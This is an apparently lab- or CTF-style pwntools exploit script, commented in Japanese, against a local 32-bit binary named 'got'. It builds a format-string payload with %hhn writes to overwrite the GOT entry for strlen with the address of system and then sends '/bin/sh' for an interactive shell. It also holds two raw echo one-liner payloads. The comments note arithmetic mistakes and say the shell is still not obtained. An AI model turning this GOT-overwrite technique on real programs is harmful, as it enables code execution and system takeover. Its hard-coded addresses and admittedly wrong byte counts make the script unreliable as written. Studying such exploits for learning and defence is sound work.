#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.bits = 32
context.endian = 'little'

#execvaddr = 0xf7e93d80 
systemaddr = 0xf7e0e000 #ASLR無効でgdb -q got; b main, r, p systemで検出した値。
strlenaddr = 0x0804b284 #readelf -r got | grep strlenで検出した値。 時間おいたら値が変わっていた。これが最後まで動かなかった原因。
wannado = '/bin/sh'

#strlenのアドレスを最初に積む。
#payload = '\x14\xc0\x04\x08'
#payload += '\x15\xc0\x04\x08'
#payload += '\x16\xc0\x04\x08'
#payload += '\x17\xc0\x04\x08'

payload = p32(0x0804b284)
payload += p32(0x0804b285)
payload += p32(0x0804b286)
payload += p32(0x0804b287)

#payload = p32(strlenaddr)
#payload += p32(strlenaddr + 1)
#payload += p32(strlenaddr + 2)
#payload += p32(strlenaddr + 3)

#execvaddrを組み立てるために1byteずつ書き込む
#payload += b'%112c%4$hhn' #execvaddrの末尾80 (decimal 128) 128-16=112
#payload += b'%189c%5$hhn' #execvaddrの末尾3d (decimal 61)  256-128+61=189
#payload += b'%44c%6$hhn' #execvaddrの末尾e9 (decimal 233) 233-189=44
#payload += b'%14c%7$hhn' #execvaddrの末尾f7 (decimal 247) 247-233=14

#systemaddrを組み立てるために1byteずつ書き込む
payload += b'%240c%4$hhn' #systemaddrの末尾00。既に書き込んだアドレス16バイト（10進数) + xバイト = 00　 xの値を書き込む。
payload += b'%224c%5$hhn' #systemaddrのe0。decimalにすると224。いま240byte書き込んでいる状態なので、←ここが間違えている。256バイト書き込んでいる状態なので、が正しい。
payload += b'%256c%6$hhn' #systemaddrのe0。前回書きこんだ224を一旦0(+32)して256をふんで0にしてから、224をたす。合計256。
payload += b'%23c%7$hhn' #systemaddrのf7。f7は10進数で247。前回256しているが、「実態は224なので」247にするために23を足す。　
#payload += '\n'
#payload += wannado

p = process('./got')
p.sendline(payload) #1回目のfgets
#gdb.attach(p) #　x 0x0804c014でf7e0e000を組めたことが見て取れる。 
p.recvline()
p.sendline(wannado) #2回目のfgets
p.interactive() #しかしshellがとれない。

# (echo -e '\x14\xc0\x04\x08\x15\xc0\x04\x08\x16\xc0\x04\x08\x17\xc0\x04\x08%112c%4$hhn%189c%5$hhn%44c%6$hhn%14c%7$hhn\n/bin/sh'; cat)| ./got   WHY CANT GET SHELL!! 
# (echo -e '\x14\xc0\x04\x08\x15\xc0\x04\x08\x16\xc0\x04\x08\x17\xc0\x04\x08%240c%4$hhn%224c%5$hhn%256c%6$hhn%279c%7$hhn\n/bin/sh'; cat)| ./got   WHY CANT GET SHELL!! 
